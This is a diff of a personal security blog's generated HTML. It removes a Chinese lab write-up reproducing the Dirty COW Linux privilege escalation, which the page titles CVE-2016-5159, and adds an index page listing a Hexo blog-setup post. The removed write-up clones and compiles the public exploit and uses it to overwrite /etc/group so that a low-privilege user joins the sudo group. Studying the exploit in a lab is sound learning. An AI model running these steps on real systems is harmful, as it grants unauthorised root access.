@@ -5,13 +5,12 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CVE-2016-5159 复现 - Knlvre</title>
+    <title>Knlvre - 信息安全成长过程中的一些学习记录</title>
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate">
     <meta name="keywords" content="TriDiamond Obsidian,"> 
-    <meta name="description" content="漏洞大名鼎鼎的脏牛（Dirty Cow）
-该漏洞是 Linux 内核的内存子系统在处理写时拷贝（Copy-on-Write）时存在条件竞争漏洞， 导致可以破坏私有只读内存映射。黑客可以在获取低权限的,"> 
+    
     <meta name="author" content="Knlvre"> 
     <link rel="alternative" href="atom.xml" title="Knlvre" type="application/atom+xml"> 
     <link rel="icon" href="/knlvre.github.io/img/favicon.png"> 
@@ -37,77 +36,122 @@
     </div>
     <span id="config-title" style="display:none">Knlvre</span>
     <div id="loader"></div>
-    <div id="single">
-    <div class="scrollbar gradient-bg-rev"></div>
-<div id="top" style="display: block;">
-    <div class="bar" style="width: 0;"></div>
-    <div class="navigation animated fadeIn fast delay-1s">
-        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="https://knlvre.github.io">
-        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
-        <h3 class="subtitle">CVE-2016-5159 复现</h3>
-        <div class="social">
-            <!--        <div class="like-icon">-->
-            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
-            <!--        </div>-->
-            <div>
-                <div class="share">
-                    
-                        <a href="javascript:;" class="iconfont icon-share1"></a>
-                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
-                    
-                </div>
-            </div>
+    <div class="nav">
+    <ul id="menu-menu" class="menu">
+        
+        <li class="animated fadeInDown menu-item menu-item-type-post_type menu-item-object-page">
+            <a href="/knlvre.github.io/whoami/" title="ABOUT">ABOUT</a>
+        </li>
+        
+        <li class="animated fadeInDown menu-item menu-item-type-post_type menu-item-object-page">
+            <a href="/knlvre.github.io/tags/" title="TAGS">TAGS</a>
+        </li>
+        
+        <li class="animated fadeInDown menu-item menu-item-type-post_type menu-item-object-page">
+            <a href="/knlvre.github.io/archives/" title="ARCHIVES">ARCHIVES</a>
+        </li>
+        
+    </ul>
+    <p class="copyright" id="copyright">
+        &copy; 2019 Knlvre.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+    </p>
+</div>
+
+<div id="container">
+    
+<div class="search-box">
+    <form class="site-search-form">
+        <span class="iconfont icon-search"></span>
+        <input type="text" id="local-search-input" class="st-search-input" />
+        <div class="iconfont icon-cross search-box-close"></div>
+    </form>
+    <div class="search-scrollable">
+        <div id="local-search-result" class="local-search-result-cls" data-initialise="Initialising search index..."
+            data-start="Please input search keywords." data-empty="No result found, please try other keywords.">
+            <span>Please input search keywords.</span>
         </div>
     </div>
 </div>
-
-    <div class="section">
-        <div class=article-header-wrapper>
-    <div class="article-header">
-        <div class="article-cover animated fadeIn" style="
-            animation-delay: 600ms;
-            animation-duration: 1.2s;
-            background-image: 
-                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
-                url(/img/cover.jpg);">
+<div id="header">
+    <div>
+        <div class="logo animated fadeInDown">
+            <img src="/img/favicon.png" alt="">
+            <a class="image-logo" href="/"></a>
         </div>
-        <div class="else">
-            <p class="animated fadeInDown">
-                
-                <a href="javascript:;"><b>「 </b>Article<b> 」</b></a>
-                
-                October 19, 2019
-            </p>
-            <h3 class="post-title animated fadeInDown"><a href="/knlvre.github.io/2019/10/19/CVE-2016-5159 复现/" title="CVE-2016-5159 复现">CVE-2016-5159 复现</a>
-            </h3>
+        <ul id="menu-menu" class="menu text-menu">
             
-            <p class="post-count animated fadeInDown">
-                
-                <span>
-                    <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    3k
-                </span>
-                
-                
-                <span>
-                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    3 mins.
-                </span>
-                
-                
-                
-                <span id="busuanzi_container_page_pv">
-                    <b class="iconfont icon-read"></b> <i>Read count</i>
-                    <span id="busuanzi_value_page_pv">0</span>
-                </span>
-                
-            </p>
+            <li class="animated fadeInDown menu-item menu-item-type-post_type menu-item-object-page">
+                <a href="/knlvre.github.io/whoami/" title="ABOUT" class="menu-link">ABOUT</a>
+            </li>
+            
+            <li class="animated fadeInDown menu-item menu-item-type-post_type menu-item-object-page">
+                <a href="/knlvre.github.io/tags/" title="TAGS" class="menu-link">TAGS</a>
+            </li>
+            
+            <li class="animated fadeInDown menu-item menu-item-type-post_type menu-item-object-page">
+                <a href="/knlvre.github.io/archives/" title="ARCHIVES" class="menu-link">ARCHIVES</a>
+            </li>
             
             
-            <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/knlvre.github.io/tags/渗透测试/">渗透测试</a></li></ul>
-            
+        </ul>
+        <div class="iconfont icon-menu switchmenu gradient-text animated fadeInDown"></div>
+    </div>
+</div>
+<div id="screen">
+    <div id="mark">
+        <div class="cover animated fadeIn" style="
+            animation-delay: 900ms;
+            animation-duration: 2.8s;
+            background-image:
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.56), #100e17),
+                url(http://pic.netbian.com/uploads/allimg/180325/192744-1521977264b903.jpg);">
         </div>
     </div>
+    
+    <div id="post0" class="else">
+        <p class="animated fadeInDown">
+            
+            <a href="javascript:;"><b>「 </b>Article<b> 」</b></a>
+            
+            January 27, 2019
+        </p>
+        <h3 class="post-title animated fadeInDown">
+            <a href="/knlvre.github.io/2019/01/27/hexo+github搭建博客/" title="hexo + github搭建博客" class="posttitle">hexo + github搭建博客</a></h3>
+        
+        <p class="post-count animated fadeInDown">
+            
+            <span>
+                <b class="iconfont icon-text2"></b> <i>Words count</i>
+                2.8k
+            </span>
+            
+            
+            <span>
+                <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                3 mins.
+            </span>
+            
+            
+        </p>
+        
+        
+        <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/knlvre.github.io/tags/博客搭建/">博客搭建</a></li></ul>
+        
+        <div class="md-content animated fadeIn">
+            
+            <p>前面大致的步骤参考这篇文章：<a href="https://mochazz.github.io/2017/07/26/hexo-build/" target="_blank" rel="noopener">https://mochazz.github.io/2017/07/26/hexo-build/</a></p>
+<p>仓库的名字用<strong>your_name.github.io</strong>就可以</p>
+<p></p>
+<p></p>
+<p>去这个网站下...</p>
+            
+            <span class="read-more"><a href="/knlvre.github.io/2019/01/27/hexo+github搭建博客/" title="Read article" class="posttitle">Read article</a>
+                <b class="iconfont icon-arrow-right- gradient-text"></b></span>
+        </div>
+    </div>
+    
 </div>
 
 <div class="screen-gradient-after">
@@ -115,147 +159,73 @@
         <div class="screen-gradient-content-inside">
             <div class="bold-underline-links screen-gradient-sponsor">
                 <p>
-                    <span class="animated fadeIn delay-1s"></span>
+                    <span class="typed-text"></span>
                 </p>
             </div>
         </div>
     </div>
 </div>
 
-<div class="article">
-    <div class='main'>
-        <div class="content markdown animated fadeIn">
-            <h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>大名鼎鼎的<code>脏牛（Dirty Cow）</code></p>
-<p>该漏洞是 Linux 内核的内存子系统在处理写时拷贝（Copy-on-Write）时存在条件竞争漏洞， 导致可以破坏私有只读内存映射。黑客可以在获取低权限的的本地用户后，利用此漏洞获取 其他只读内存映射的写权限，进一步获取 root 权限</p>
-<p>影响的范围： 大于2.6.22版本 (2007年发行，2016年10月18日修复) </p>
-<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>虚拟机平台：VMware Workstation Pro</p>
-<p>靶机： Ubuntu 14.04</p>
-<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p>先创建一个<code>模拟用户：dirtycow_user</code>，该用户其他属性保持默认</p>
-<pre><code class="bash">root@e4e92f9fc518:/# useradd dirtycow_user
-
-root@e4e92f9fc518:/# tail -3 /etc/passwd
-libuuid:x:100:101::/var/lib/libuuid:
-syslog:x:101:104::/home/syslog:/bin/false
-dirtycow_user:x:1000:1000::/home/dirtycow_user:
-
-root@e4e92f9fc518:/# 
-
-root@e4e92f9fc518:/# su dirtycow_user
-
-dirtycow_user@e4e92f9fc518:/$ id
-uid=1000(dirtycow_user) gid=1000(dirtycow_user) groups=1000(dirtycow_user)
-
-dirtycow_user@e4e92f9fc518:/$ 
-</code></pre>
-<p>直接从 gayhub 上下载最正宗的 exp</p>
-<pre><code class="bash">root@ac17889d2f52:/# git clone https://github.com/dirtycow/dirtycow.github.io
-Cloning into &#39;dirtycow.github.io&#39;...
-remote: Enumerating objects: 231, done.
-remote: Total 231 (delta 0), reused 0 (delta 0), pack-reused 231
-Receiving objects: 100% (231/231), 138.47 KiB | 60.00 KiB/s, done.
-Resolving deltas: 100% (131/131), done.
-Checking connectivity... done.
-
-root@ac17889d2f52:/# cd dirtycow.github.io/
-
-root@ac17889d2f52:/dirtycow.github.io# ls
-CNAME  README.md  cow.svg  dirtyc0w.c  favicon.ico  index.html  pokemon.c
-
-root@ac17889d2f52:/dirtycow.github.io# 
-</code></pre>
-<p>编译该 exp （我这里 lpthread 前要加一个横线，否则会保存，提示找不到 pthread）</p>
-<pre><code class="bash">root@ac17889d2f52:/dirtycow.github.io# gcc dirtyc0w.c -o dirtycow -lpthread
-
-root@ac17889d2f52:/dirtycow.github.io# ls
-CNAME  README.md  cow.svg  dirtyc0w.c  dirtycow  favicon.ico  index.html  pokemon.c
-
-root@ac17889d2f52:/dirtycow.github.io# 
-</code></pre>
-<p>执行 exp ，由于没有正确地添加必要的参数，所以给出了<code>usage</code>提示</p>
-<p>Ps：可以用命令<code>./dirtycow [filename] &quot;123&quot;</code>，将文件内容覆盖为<code>123</code></p>
-<pre><code class="bash">root@ac17889d2f52:/dirtycow.github.io# ./dirtycow
-usage: dirtyc0w target_file new_content
-</code></pre>
-<p>使用如下命令，修改<code>/etc/group</code>，将 dirtycow_user 用户加进<code>sudo组</code>内</p>
-<pre><code class="bash">./dirtycow /etc/group &quot;$(sed &#39;/\(sudo*\)/ s/$/,dirtycow_user/&#39; /etc/group)&quot;
-</code></pre>
-<p>查看 /etc/group 查看结果</p>
-<pre><code class="bash">root@ac17889d2f52:/dirtycow.github.io# ./dirtycow 
-sudo:x:27:dirtycow_user
-</code></pre>
-<hr>
-<p><strong>Reference</strong></p>
-<p><a href="https://blog.csdn.net/wanzt123/article/details/81879680" target="_blank" rel="noopener">https://blog.csdn.net/wanzt123/article/details/81879680</a></p>
-<p><a href="https://blog.csdn.net/haha13l4/article/details/96913574" target="_blank" rel="noopener">https://blog.csdn.net/haha13l4/article/details/96913574</a></p>
-
-            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
-            <audio id="audio" loop="1" preload="auto" controls="controls"
-                data-autoplay="false">
-                <source type="audio/mpeg" src="">
-            </audio>
+    <div id="primary">
+        
+<div class="post" id="post">
+    <div class="post-cover animated fadeIn" style="
+            background-image:
+            radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+            url(http://pic.netbian.com/uploads/allimg/180325/192744-1521977264b903.jpg);">
+    </div>
+    <div class="else">
+        <p class="animated fadeInDown">
             
-            <ul id="audio-list" style="display:none">
+                <a href="javascript:;"><b>「 </b>Article<b> 」</b></a>
+            
+            January 27, 2019
+        </p>
+        <h3 class="post-title animated fadeInDown"><a href="/knlvre.github.io/2019/01/27/hexo+github搭建博客/" title="hexo + github搭建博客" class="posttitle">hexo + github搭建博客</a></h3>
+        
+            <p class="post-count animated fadeInDown">
+                
+                    <span>
+                        <b class="iconfont icon-text2"></b> <i>Words count</i>
+                        2.8k
+                    </span>
                 
                 
-                <li title='0' data-url='/knlvre.github.io/statics/forhim.mp3'></li>
+                    <span>
+                        <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                        3 mins.
+                    </span>
                 
-                    
-            </ul>
+                
+            </p>
             
+                <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/knlvre.github.io/tags/博客搭建/">博客搭建</a></li></ul>
             
+        
+        <div class="md-content animated fadeIn">
             
-    <div id='gitalk-container' class="comment link"
-        data-ae='true'
-        data-ci='ec894e2b66f752e8b7fb'
-        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
-        data-r='blog-comments'
-        data-o='TriDiamond'
-        data-a='TriDiamond'
-        data-d=''
-    >Comments</div>
-
-
+                <p>前面大致的步骤参考这篇文章：<a href="https://mochazz.github.io/2017/07/26/hexo-build/" target="_blank" rel="noopener">https://mochazz.github.io/2017/07/26/hexo-build/</a></p>
+<p>仓库的名字用<strong>your_name.github.io</strong>就可以</p>
+<p></p>
+<p></p>
+<p>去这个网站下载主题：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a></p>
+<p>挑选好喜欢的博客后，点击链接到他们Github的页面，下载下来</p>
+<p></p>
+<p>直接解压到 <strong>themes</strong> 这个文件夹下</p>
+<p></p>
+<p>然后在 <strong>_config.yml</strong> 这个配置文件中 <strong>Extensions</strong> 模块的 <strong>theme</strong> 改成刚才那个文件的名字，模板就运用成功了，然后...</p>
             
-            
-        </div>
-        <div class="sidebar">
-            <div class="box animated fadeInRight">
-                <div class="subbox">
-                    <img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ico/HaZong.jpg" height=300 width=300></img>
-                    <p>Knlvre</p>
-                    <span>Notes During Information Security Learning.</span>
-                    <dl>
-                        <dd><a href="https://github.com/knlvre" target="_blank"><span
-                                    class=" iconfont icon-github"></span></a></dd>
-                        <dd><a href="https://github.com/knlvre" target="_blank"><span
-                                    class=" iconfont icon-twitter"></span></a></dd>
-                        <dd><a href="https://github.com/knlvre" target="_blank"><span
-                                    class=" iconfont icon-stack-overflow"></span></a></dd>
-                    </dl>
-                </div>
-                <ul>
-                    <li><a href="/">61 <p>Articles</p></a></li>
-                    <li><a href="/categories">0 <p>Categories</p></a></li>
-                    <li><a href="/tags">9 <p>Tags</p></a></li>
-                </ul>
-            </div>
-            
-            
-            
-            <div class="box sticky animated fadeInRight faster">
-                <div id="toc" class="subbox">
-                    <h4>Contents</h4>
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞"><span class="toc-number">1.</span> <span class="toc-text">漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#环境"><span class="toc-number">2.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#渗透测试"><span class="toc-number">3.</span> <span class="toc-text">渗透测试</span></a></li></ol>
-                </div>
-            </div>
-            
-            
+            <span class="read-more"><a href="/knlvre.github.io/2019/01/27/hexo+github搭建博客/" title="Read article" class="posttitle">Read article</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
         </div>
     </div>
 </div>
 
+
     </div>
+    
 </div>
+<div id="preview"></div>
+
     <div id="back-to-top" class="animated fadeIn faster">
         <div class="flow"></div>
         <span class="percentage animated fadeIn faster">0%</span>
